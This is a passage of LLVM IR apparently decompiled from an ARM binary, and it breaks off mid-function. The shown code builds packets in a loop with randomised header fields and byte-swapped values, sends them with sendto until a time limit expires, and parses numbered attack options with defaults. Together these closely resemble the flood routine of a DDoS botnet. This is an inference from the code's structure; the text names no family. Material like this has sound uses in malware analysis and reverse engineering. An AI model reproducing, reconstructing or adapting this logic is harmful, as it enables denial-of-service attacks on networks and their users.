  %v5_b970 = mul i32 %v3_b964, 24
  store i32 %v5_b970, i32* %r2.global-to-local, align 4
  %v4_b97436 = udiv i32 %v4_b960, 256
  %v1_b978 = trunc i32 %v4_b97436 to i8
  %v2_b978 = load i32, i32* @r7, align 4
  %v3_b978 = add i32 %v2_b978, 7
  %v4_b978 = inttoptr i32 %v3_b978 to i8*
  store i8 %v1_b978, i8* %v4_b978, align 1
  %v0_b97c = load i32, i32* %r2.global-to-local, align 4
  %v1_b97c = load i32, i32* @sb, align 4
  %v2_b97c = add i32 %v1_b97c, %v0_b97c
  store i32 %v2_b97c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b984 = load i32, i32* @r7, align 4
  %v4_b984 = add i32 %v3_b984, 6
  %v5_b984 = inttoptr i32 %v4_b984 to i8*
  store i8 %v5_b960, i8* %v5_b984, align 1
  %v0_b988 = load i32, i32* %r1.global-to-local, align 4
  %v1_b988 = load i32, i32* %lr.global-to-local, align 4
  %v2_b988 = add i32 %v1_b988, 4
  %v3_b988 = inttoptr i32 %v2_b988 to i32*
  store i32 %v0_b988, i32* %v3_b988, align 4
  %v0_b98c = load i32, i32* %r3.global-to-local, align 4
  %v1_b98c = trunc i32 %v0_b98c to i8
  %v2_b98c = load i32, i32* %r2.global-to-local, align 4
  %v3_b98c = load i32, i32* @sb, align 4
  %v4_b98c = add i32 %v3_b98c, %v2_b98c
  %v5_b98c = inttoptr i32 %v4_b98c to i8*
  store i8 %v1_b98c, i8* %v5_b98c, align 1
  %v0_b990 = load i32, i32* @sl, align 4
  %v1_b990 = trunc i32 %v0_b990 to i8
  %v2_b990 = load i32, i32* %lr.global-to-local, align 4
  %v3_b990 = add i32 %v2_b990, 2
  %v4_b990 = inttoptr i32 %v3_b990 to i8*
  store i8 %v1_b990, i8* %v4_b990, align 1
  %v0_b994 = load i32, i32* @sl, align 4
  %v1_b994 = trunc i32 %v0_b994 to i8
  %v2_b994 = load i32, i32* %lr.global-to-local, align 4
  %v3_b994 = add i32 %v2_b994, 1
  %v4_b994 = inttoptr i32 %v3_b994 to i8*
  store i8 %v1_b994, i8* %v4_b994, align 1
  %v0_b998 = load i32, i32* @sl, align 4
  %v1_b998 = trunc i32 %v0_b998 to i8
  %v2_b998 = load i32, i32* %lr.global-to-local, align 4
  %v3_b998 = add i32 %v2_b998, 3
  %v4_b998 = inttoptr i32 %v3_b998 to i8*
  store i8 %v1_b998, i8* %v4_b998, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b9a4 = load i32, i32* @r5, align 4
  store i32 %v0_b9a4, i32* %r1.global-to-local, align 4
  store i32 %v3_b51c, i32* %r0.global-to-local, align 4
  %v0_b9ac = load i32, i32* @fp, align 4
  store i32 %v0_b9ac, i32* %r2.global-to-local, align 4
  %v0_b9b0 = load i32, i32* %lr.global-to-local, align 4
  %v4_b9b0 = inttoptr i32 %v0_b9b0 to %sockaddr*
  %v7_b9b8 = inttoptr i32 %v0_b9a4 to i32*
  %v9_b9b8 = call i32 @sendto(i32 %v3_b51c, i32* %v7_b9b8, i32 %v0_b9ac, i32 16384, %sockaddr* %v4_b9b0, i32 16)
  %v3_b9bc = load i32, i32* %stack_var_-40, align 4
  %v1_b9c0 = add i32 %v3_b9bc, 1
  store i32 %v1_b9c0, i32* %r0.global-to-local, align 4
  store i32 %v1_b3ac, i32* %r3.global-to-local, align 4
  %v9_b9c8 = icmp eq i32 %v1_b9c0, %v1_b3ac
  store i1 %v9_b9c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b9c0, i32* %stack_var_-40, align 4
  %v6_b9d0 = icmp slt i32 %v1_b9c0, %v1_b3ac
  br i1 %v6_b9d0, label %dec_label_pc_b9d4, label %dec_label_pc_bb24

dec_label_pc_b9d4:                                ; preds = %dec_label_pc_b900, %dec_label_pc_b830
  %v1_b9e8 = phi i32 [ %v1_b9c0, %dec_label_pc_b900 ], [ 0, %dec_label_pc_b830 ]
  %v5_b9d8 = mul i32 %v1_b9e8, 24
  %v1_b9dc = load i32, i32* @sb, align 4
  %v2_b9dc = add i32 %v1_b9dc, %v5_b9d8
  store i32 %v2_b9dc, i32* %r3.global-to-local, align 4
  store i32 %v4_b3d8, i32* %r1.global-to-local, align 4
  %v1_b9e4 = add i32 %v2_b9dc, 20
  %v2_b9e4 = inttoptr i32 %v1_b9e4 to i8*
  %v3_b9e4 = load i8, i8* %v2_b9e4, align 1
  %v4_b9e4 = zext i8 %v3_b9e4 to i32
  store i32 %v4_b9e4, i32* %r2.global-to-local, align 4
  %v4_b9e8 = mul i32 %v1_b9e8, 4
  %v5_b9e8 = add i32 %v4_b9e8, %v4_b3d8
  %v6_b9e8 = inttoptr i32 %v5_b9e8 to i32*
  %v7_b9e8 = load i32, i32* %v6_b9e8, align 4
  store i32 %v7_b9e8, i32* @r5, align 4
  %v2_b9ec = icmp ugt i8 %v3_b9e4, 30
  %v7_b9ec = icmp eq i8 %v3_b9e4, 31
  store i1 %v7_b9ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b9f0 = add i32 %v7_b9e8, 24
  store i32 %v1_b9f0, i32* @r8, align 4
  %v1_b9f4 = add i32 %v7_b9e8, 38
  store i32 %v1_b9f4, i32* @r6, align 4
  %v1_b9f8 = add i32 %v7_b9e8, 58
  store i32 %v1_b9f8, i32* @r7, align 4
  %v2_b9fc = xor i1 %v7_b9ec, true
  %v3_b9fc = and i1 %v2_b9ec, %v2_b9fc
  br i1 %v3_b9fc, label %dec_label_pc_b850, label %dec_label_pc_ba00

dec_label_pc_ba00:                                ; preds = %dec_label_pc_b9d4
  %v1_ba00 = add i32 %v2_b9dc, 16
  %v2_ba00 = inttoptr i32 %v1_ba00 to i32*
  %v3_ba00 = load i32, i32* %v2_ba00, align 4
  store i32 %v3_ba00, i32* %r4.global-to-local, align 4
  %v0_ba04 = call i32 @function_105b0()
  store i32 %v0_ba04, i32* %r0.global-to-local, align 4
  %v3_ba08 = load i32, i32* %stack_var_-40, align 4
  %v5_ba10 = mul i32 %v3_ba08, 24
  %v0_ba14 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba18 = load i32, i32* @sb, align 4
  %v2_ba18 = add i32 %v1_ba18, %v5_ba10
  store i32 %v2_ba18, i32* %r1.global-to-local, align 4
  %v1_ba1c = and i32 %v0_ba14, 65280
  store i32 %v1_ba1c, i32* %r3.global-to-local, align 4
  %v1_ba14 = udiv i32 %v0_ba14, 256
  %v3_ba20 = and i32 %v1_ba14, 65280
  store i32 %v3_ba20, i32* %r2.global-to-local, align 4
  %v3_ba24 = mul i32 %v0_ba14, 16777216
  store i32 %v3_ba24, i32* %ip.global-to-local, align 4
  %v1_ba28 = add i32 %v2_ba18, 20
  %v2_ba28 = inttoptr i32 %v1_ba28 to i8*
  %v3_ba28 = load i8, i8* %v2_ba28, align 1
  %v4_ba28 = zext i8 %v3_ba28 to i32
  store i32 %v4_ba28, i32* %lr.global-to-local, align 4
  %v4_ba2c = mul nuw nsw i32 %v1_ba1c, 256
  %v5_ba2c = or i32 %v4_ba2c, %v3_ba24
  store i32 %v5_ba2c, i32* %ip.global-to-local, align 4
  %v2_ba34 = call i32 @llvm.bswap.i32(i32 %v0_ba14)
  %v7_ba38 = lshr i32 %v0_ba04, %v4_ba28
  %v8_ba38 = add i32 %v7_ba38, %v2_ba34
  %v3_ba44 = mul i32 %v8_ba38, 16777216
  %v1_ba48 = and i32 %v8_ba38, 65280
  store i32 %v1_ba48, i32* %r0.global-to-local, align 4
  store i32 %v5_b4f8, i32* %r2.global-to-local, align 4
  %v4_ba54 = mul nuw nsw i32 %v1_ba48, 256
  %v5_ba54 = or i32 %v4_ba54, %v3_ba44
  store i32 %v5_ba54, i32* %r1.global-to-local, align 4
  %v2_ba58 = call i32 @llvm.bswap.i32(i32 %v8_ba38)
  store i32 %v2_ba58, i32* %r3.global-to-local, align 4
  store i1 %v7_b854, i1* %cpsr_z.global-to-local, align 1
  %v1_ba60 = load i32, i32* @r5, align 4
  %v2_ba60 = add i32 %v1_ba60, 16
  %v3_ba60 = inttoptr i32 %v2_ba60 to i32*
  store i32 %v2_ba58, i32* %v3_ba60, align 4
  br i1 %v2_b854, label %dec_label_pc_ba68, label %dec_label_pc_b85c

dec_label_pc_ba68:                                ; preds = %dec_label_pc_ba00, %dec_label_pc_b850
  %v0_ba68 = call i32 @function_105b0()
  store i32 %v0_ba68, i32* %r0.global-to-local, align 4
  store i32 %v3_b574, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_ba78, i1* %cpsr_z.global-to-local, align 1
  %v1_ba7c = load i32, i32* @r5, align 4
  %v2_ba7c = add i32 %v1_ba7c, 12
  %v3_ba7c = inttoptr i32 %v2_ba7c to i32*
  store i32 %v0_ba68, i32* %v3_ba7c, align 4
  br i1 %v9_ba78, label %dec_label_pc_ba84, label %dec_label_pc_ba68.dec_label_pc_b870_crit_edge

dec_label_pc_ba68.dec_label_pc_b870_crit_edge:    ; preds = %dec_label_pc_ba68
  %v1_b874.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b870

dec_label_pc_ba84:                                ; preds = %dec_label_pc_ba68, %dec_label_pc_b85c
  %v0_ba84 = call i32 @function_105b0()
  %v3_ba8c = urem i32 %v0_ba84, 65536
  store i32 %v3_ba8c, i32* %r0.global-to-local, align 4
  %v1_ba94 = sub nsw i32 999, %v3_ba8c
  store i32 %v1_ba94, i32* %r2.global-to-local, align 4
  %v3_ba98 = sdiv i32 %v1_ba94, 256
  store i32 %v3_ba98, i32* %r1.global-to-local, align 4
  %v3_ba9c35 = udiv i32 %v3_ba8c, 256
  store i32 %v3_ba9c35, i32* %r3.global-to-local, align 4
  %v1_baa0 = trunc i32 %v3_ba9c35 to i8
  %v2_baa0 = load i32, i32* @r5, align 4
  %v3_baa0 = add i32 %v2_baa0, 5
  %v4_baa0 = inttoptr i32 %v3_baa0 to i8*
  store i8 %v1_baa0, i8* %v4_baa0, align 1
  %v0_baa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_baa4 = trunc i32 %v0_baa4 to i8
  %v2_baa4 = load i32, i32* @r5, align 4
  %v3_baa4 = add i32 %v2_baa4, 4
  %v4_baa4 = inttoptr i32 %v3_baa4 to i8*
  store i8 %v1_baa4, i8* %v4_baa4, align 1
  %v0_baa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_baa8 = trunc i32 %v0_baa8 to i8
  %v2_baa8 = load i32, i32* @r6, align 4
  %v3_baa8 = add i32 %v2_baa8, 5
  %v4_baa8 = inttoptr i32 %v3_baa8 to i8*
  store i8 %v1_baa8, i8* %v4_baa8, align 1
  store i32 %v3_b578, i32* %r1.global-to-local, align 4
  %v1_bab0 = load i32, i32* @r4, align 4
  %v9_bab0 = icmp eq i32 %v3_b578, %v1_bab0
  store i1 %v9_bab0, i1* %cpsr_z.global-to-local, align 1
  %v0_bab4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bab4 = trunc i32 %v0_bab4 to i8
  %v2_bab4 = load i32, i32* @r6, align 4
  %v3_bab4 = add i32 %v2_bab4, 4
  %v4_bab4 = inttoptr i32 %v3_bab4 to i8*
  store i8 %v1_bab4, i8* %v4_bab4, align 1
  %v0_bab8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bab8, label %dec_label_pc_babc, label %dec_label_pc_ba84.dec_label_pc_b87c_crit_edge

dec_label_pc_ba84.dec_label_pc_b87c_crit_edge:    ; preds = %dec_label_pc_ba84
  %v1_b880.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b87c

dec_label_pc_babc:                                ; preds = %dec_label_pc_ba84, %dec_label_pc_b870
  %v0_babc = call i32 @function_105b0()
  %v1_babc = trunc i32 %v0_babc to i8
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v3_b57c, i32* %r2.global-to-local, align 4
  %v4_bac4 = sdiv i32 %v0_babc, 256
  store i32 %v4_bac4, i32* %r3.global-to-local, align 4
  %v1_bac8 = load i32, i32* @r4, align 4
  %v9_bac8 = icmp eq i32 %v3_b57c, %v1_bac8
  store i1 %v9_bac8, i1* %cpsr_z.global-to-local, align 1
  %v3_bacc = load i32, i32* @r5, align 4
  %v4_bacc = add i32 %v3_bacc, 58
  %v5_bacc = inttoptr i32 %v4_bacc to i8*
  store i8 %v1_babc, i8* %v5_bacc, align 1
  %v0_bad0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bad0 = trunc i32 %v0_bad0 to i8
  %v2_bad0 = load i32, i32* @r7, align 4
  %v3_bad0 = add i32 %v2_bad0, 1
  %v4_bad0 = inttoptr i32 %v3_bad0 to i8*
  store i8 %v1_bad0, i8* %v4_bad0, align 1
  %v0_bad4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bad4, label %dec_label_pc_bad8, label %dec_label_pc_b888

dec_label_pc_bad8:                                ; preds = %dec_label_pc_babc, %dec_label_pc_b87c
  %v0_bad8 = call i32 @function_105b0()
  %v1_bad8 = trunc i32 %v0_bad8 to i8
  store i32 %v0_bad8, i32* %r0.global-to-local, align 4
  %v4_badc37 = udiv i32 %v0_bad8, 256
  %v1_bae0 = trunc i32 %v4_badc37 to i8
  %v2_bae0 = load i32, i32* @r7, align 4
  %v3_bae0 = add i32 %v2_bae0, 3
  %v4_bae0 = inttoptr i32 %v3_bae0 to i8*
  store i8 %v1_bae0, i8* %v4_bae0, align 1
  store i32 %v1_b570, i32* %r3.global-to-local, align 4
  store i1 %v2_bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bae8, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_bad8
  %v1_baec = load i32, i32* @r5, align 4
  %v2_baec = add i32 %v1_baec, 16
  %v3_baec = inttoptr i32 %v2_baec to i32*
  %v4_baec = load i32, i32* %v3_baec, align 4
  store i32 %v4_baec, i32* %r3.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_bad8, %bb101
  %v3_baf0 = load i32, i32* @r7, align 4
  %v4_baf0 = add i32 %v3_baf0, 2
  %v5_baf0 = inttoptr i32 %v4_baf0 to i8*
  store i8 %v1_bad8, i8* %v5_baf0, align 1
  %v0_baf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_baf4, label %dec_label_pc_bafc, label %bb103

bb103:                                            ; preds = %bb102
  %v1_baf4 = load i32, i32* %r3.global-to-local, align 4
  %v2_baf4 = load i32, i32* @r6, align 4
  %v3_baf4 = add i32 %v2_baf4, 16
  %v4_baf4 = inttoptr i32 %v3_baf4 to i32*
  store i32 %v1_baf4, i32* %v4_baf4, align 4
  br label %dec_label_pc_b89c

dec_label_pc_bafc:                                ; preds = %dec_label_pc_b888, %bb102
  %v0_bafc = call i32 @function_105b0()
  store i32 %v0_bafc, i32* %r0.global-to-local, align 4
  %v1_bb00 = load i32, i32* @r6, align 4
  %v2_bb00 = add i32 %v1_bb00, 16
  %v3_bb00 = inttoptr i32 %v2_bb00 to i32*
  store i32 %v0_bafc, i32* %v3_bb00, align 4
  br label %dec_label_pc_b89c

dec_label_pc_bb08:                                ; preds = %dec_label_pc_b89c
  %v0_bb08 = load i32, i32* @r7, align 4
  %v1_bb08 = add i32 %v0_bb08, 8
  store i32 %v1_bb08, i32* @r4, align 4
  store i32 %v1_bb08, i32* %r0.global-to-local, align 4
  store i32 %v5_b4a4, i32* %r1.global-to-local, align 4
  %v2_bb14 = call i32 @function_10664(i32 %v1_bb08, i32 %v5_b4a4)
  store i32 %v2_bb14, i32* %r0.global-to-local, align 4
  store i32 %v5_b4a4, i32* %r2.global-to-local, align 4
  %v0_bb1c = load i32, i32* @sl, align 4
  %v1_bb1c = trunc i32 %v0_bb1c to i8
  %v2_bb1c = load i32, i32* @r4, align 4
  %v4_bb1c = add i32 %v2_bb1c, %v5_b4a4
  %v5_bb1c = inttoptr i32 %v4_bb1c to i8*
  store i8 %v1_bb1c, i8* %v5_bb1c, align 1
  br label %dec_label_pc_b900

dec_label_pc_bb24:                                ; preds = %dec_label_pc_b900, %dec_label_pc_b81c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bb28 = call i32 @time(i32* null)
  store i32 %v2_bb28, i32* %r0.global-to-local, align 4
  store i32 %v2_b508, i32* %r1.global-to-local, align 4
  %v9_bb30 = icmp eq i32 %v2_b508, %v2_bb28
  store i1 %v9_bb30, i1* %cpsr_z.global-to-local, align 1
  %v6_bb34 = icmp slt i32 %v2_b508, %v2_bb28
  br i1 %v6_bb34, label %dec_label_pc_bb38, label %dec_label_pc_b81c

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb24, %dec_label_pc_b3a8, %dec_label_pc_bb40
  %v29_bb3c = phi i32 [ %v3_b51c, %dec_label_pc_b3a8 ], [ %v1_bb44, %dec_label_pc_bb40 ], [ %v2_bb28, %dec_label_pc_bb24 ]
  store i32 %v3_b3a8, i32* %r4.global-to-local, align 4
  store i32 %v6_b3a8, i32* %r5.global-to-local, align 4
  store i32 %v9_b3a8, i32* %r6.global-to-local, align 4
  store i32 %v12_b3a8, i32* %r7.global-to-local, align 4
  store i32 %v15_b3a8, i32* %r8.global-to-local, align 4
  store i32 %v21_b3a8, i32* %sl.global-to-local, align 4
  store i32 %v24_b3a8, i32* %fp.global-to-local, align 4
  ret i32 %v29_bb3c

dec_label_pc_bb40:                                ; preds = %dec_label_pc_b52c
  store i32 %v3_b51c, i32* %r0.global-to-local, align 4
  %v1_bb44 = call i32 @close(i32 %v3_b51c)
  store i32 %v1_bb44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb38

; uselistorder directives
  uselistorder i32 %v1_bb44, { 1, 0 }
  uselistorder i32 %v0_bad8, { 0, 2, 1 }
  uselistorder i32 %v0_babc, { 0, 2, 1 }
  uselistorder i32 %v3_ba8c, { 0, 2, 1 }
  uselistorder i32 %v2_ba58, { 1, 0 }
  uselistorder i32 %v8_ba38, { 1, 2, 0 }
  uselistorder i32 %v3_ba24, { 1, 0 }
  uselistorder i32 %v0_ba14, { 2, 0, 1, 3 }
  uselistorder i32 %v7_b9e8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_b9c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_b964, { 1, 0, 2 }
  uselistorder i32 %v4_b960, { 0, 2, 1 }
  uselistorder i32 %v0_b940, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_b930, { 0, 2, 1 }
  uselistorder i32 %v4_b914, { 1, 0 }
  uselistorder i1 %v2_bae8, { 2, 3, 1, 0 }
  uselistorder i1 %v9_ba78, { 2, 3, 1, 0 }
  uselistorder i1 %v7_b854, { 2, 1, 0 }
  uselistorder i32 %v1_b840, { 1, 0, 2 }
  uselistorder i32 %v0_b7bc, { 1, 0, 2 }
  uselistorder i32 %v3_b64c, { 1, 0 }
  uselistorder i32 %tmp87, { 1, 0, 2 }
  uselistorder i32 %v1_b5c8, { 0, 2, 1 }
  uselistorder i32 %v1_b5c0, { 2, 1, 0 }
  uselistorder i32 %v1_b5bc, { 1, 0 }
  uselistorder i32 %v1_b5b8, { 1, 0 }
  uselistorder i32 %v1_b5ac, { 1, 0 }
  uselistorder i32 %v3_b5a4, { 2, 0, 1 }
  uselistorder i32 %v3_b574, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b570, { 4, 3, 5, 1, 2, 0 }
  uselistorder i1 %v2_b56c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b564, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b560, { 0, 1, 3, 2 }
  uselistorder i1 %v7_b54c, { 1, 0 }
  uselistorder i1 %v7_b520, { 1, 0 }
  uselistorder i32 %v3_b51c, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_b508, { 2, 1, 0 }
  uselistorder i32 %v5_b4f8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_b4c4, { 1, 2, 0 }
  uselistorder i32 %v5_b4a4, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i8 %v5_b448, { 1, 0 }
  uselistorder i32 %v5_b42c, { 1, 0 }
  uselistorder i32 %v6_b3f0, { 1, 0 }
  uselistorder i32 %v4_b3d8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b3ac, { 1, 2, 3, 0, 4, 5, 6, 9, 7, 8 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 13, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 45, 46, 39, 40, 41, 42, 43, 44, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 19, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 19, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 46, 48, 47, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 10, 11, 8, 9, 13, 12, 15, 14, 16, 18, 17, 19, 21, 20, 22, 23, 24, 25, 27, 26, 31, 28, 29, 30, 34, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder label %dec_label_pc_bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bafc, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_b900, { 1, 0 }
  uselistorder label %dec_label_pc_b89c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b81c, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_bb50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_bb50:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_bb50 = load i32, i32* @r4, align 4
  %v6_bb50 = load i32, i32* @r5, align 4
  %v9_bb50 = load i32, i32* @r6, align 4
  %v12_bb50 = load i32, i32* @r7, align 4
  %v15_bb50 = load i32, i32* @r8, align 4
  %v21_bb50 = load i32, i32* @sl, align 4
  %v24_bb50 = load i32, i32* @fp, align 4
  %v1_bb54 = urem i32 %arg2, 256
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v1_bb54, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_bb70 = urem i32 %arg4, 256
  store i32 %v1_bb70, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_bb80 = call i32* @calloc(i32 %v1_bb54, i32 4)
  %v4_bb80 = ptrtoint i32* %v2_bb80 to i32
  %v0_bb84 = load i32, i32* @r5, align 4
  store i32 %v0_bb84, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_bb90 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bb90, i32* %r3.global-to-local, align 4
  %v0_bb94 = load i32, i32* @r4, align 4
  store i32 %v0_bb94, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb84 to i32*
  %v6_bb98 = call i32 @function_ad24(i32 %v0_bb94, i32* %v5_bb98, i32 2, i32 %v0_bb90)
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bbb0 = load i32, i32* @r5, align 4
  store i32 %v0_bbb0, i32* %r1.global-to-local, align 4
  %v0_bbb4 = load i32, i32* @r4, align 4
  store i32 %v0_bbb4, i32* %r0.global-to-local, align 4
  %v5_bbb8 = trunc i32 %v6_bb98 to i8
  %v6_bbbc = inttoptr i32 %v0_bbb0 to i32*
  %v7_bbbc = call i32 @function_ad24(i32 %v0_bbb4, i32* %v6_bbbc, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_bbc0 = load i32, i32* @r5, align 4
  store i32 %v0_bbc0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bbbc, i32* @r7, align 4
  %v0_bbd0 = load i32, i32* @r4, align 4
  store i32 %v0_bbd0, i32* %r0.global-to-local, align 4
  %v4_bbd4 = inttoptr i32 %v0_bbc0 to i32*
  %v5_bbd4 = call i32 @function_ad24(i32 %v0_bbd0, i32* %v4_bbd4, i32 4, i32 64)
  %v0_bbe0 = load i32, i32* @r5, align 4
  store i32 %v0_bbe0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bbec = load i32, i32* @r4, align 4
  store i32 %v0_bbec, i32* %r0.global-to-local, align 4
  %v5_bbf0 = trunc i32 %v5_bbd4 to i8
  %v6_bbf4 = inttoptr i32 %v0_bbe0 to i32*
  %v7_bbf4 = call i32 @function_ad24(i32 %v0_bbec, i32* %v6_bbf4, i32 5, i32 1)
  %v1_bc00 = urem i32 %v7_bbf4, 256
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc0c = load i32, i32* @r5, align 4
  store i32 %v0_bc0c, i32* %r1.global-to-local, align 4
  %v0_bc10 = load i32, i32* @r4, align 4
  store i32 %v0_bc10, i32* %r0.global-to-local, align 4
  %v5_bc18 = inttoptr i32 %v0_bc0c to i32*
  %v6_bc18 = call i32 @function_ad24(i32 %v0_bc10, i32* %v5_bc18, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_bc24 = load i32, i32* @r5, align 4
  store i32 %v0_bc24, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc24 to i32*
  %v6_bc34 = call i32 @function_ad24(i32 %v0_bc30, i32* %v5_bc34, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  %v0_bc3c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bc3c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_bc34, i32* @sl, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v5_bc4c = call i32 @function_ad24(i32 %v0_bc48, i32* %v4_bc4c, i32 %v0_bc3c, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc5c = load i32, i32* @r5, align 4
  store i32 %v0_bc5c, i32* %r1.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v4_bc64 = inttoptr i32 %v0_bc5c to i32*
  %v5_bc64 = call i32 @function_ad24(i32 %v0_bc60, i32* %v4_bc64, i32 1, i32 1)
